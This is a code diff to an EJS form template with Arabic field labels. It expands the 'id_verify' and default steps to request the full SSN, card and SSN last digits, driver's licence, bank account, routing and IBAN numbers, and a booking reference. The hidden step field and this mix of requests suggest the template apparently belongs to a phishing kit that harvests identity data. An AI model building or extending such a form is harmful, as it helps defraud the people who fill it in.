@@ -40,7 +40,7 @@ textarea{resize:vertical;min-height:80px}
     <input type="hidden" name="_step" value="<%= pageContent.slug %>">
 
     <% if (pageContent.form_type === 'id_verify') { %>
-      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي', address:'العنوان', passport_number:'رقم جواز السفر', nationality:'الجنسية' } %>
+      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي (SSN)', ssn_last4:'آخر 4 أرقام من SSN', card_last4:'آخر 4 أرقام من البطاقة', address:'العنوان', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', state:'الولاية', zip:'الرمز البريدي', dl_number:'رقم رخصة القيادة', phone:'رقم الجوال', email:'البريد الإلكتروني', account_number:'رقم الحساب', routing_number:'رقم التوجيه', iban:'رقم IBAN', booking_ref:'رقم الحجز', last_name:'اسم العائلة' } %>
       <% (pageContent.fields || []).forEach(f => { %>
         <div class="field-group">
           <label><%= fldLabels[f] || f %></label>
@@ -72,7 +72,7 @@ textarea{resize:vertical;min-height:80px}
       </div>
 
     <% } else { %>
-      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي', address:'العنوان', phone:'رقم الجوال', email:'البريد الإلكتروني', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', zip:'الرمز البريدي' } %>
+      <% const fldLabels = { full_name:'الاسم الكامل', dob:'تاريخ الميلاد', id_number:'رقم الهوية', ssn:'رقم الضمان الاجتماعي (SSN)', ssn_last4:'آخر 4 أرقام من SSN', card_last4:'آخر 4 أرقام من البطاقة', address:'العنوان', phone:'رقم الجوال', email:'البريد الإلكتروني', passport_number:'رقم جواز السفر', nationality:'الجنسية', city:'المدينة', state:'الولاية', zip:'الرمز البريدي', dl_number:'رقم رخصة القيادة', account_number:'رقم الحساب', routing_number:'رقم التوجيه', iban:'رقم IBAN', booking_ref:'رقم الحجز', last_name:'اسم العائلة' } %>
       <% (pageContent.fields || []).forEach(f => { %>
         <div class="field-group">
           <label><%= fldLabels[f] || f %></label>
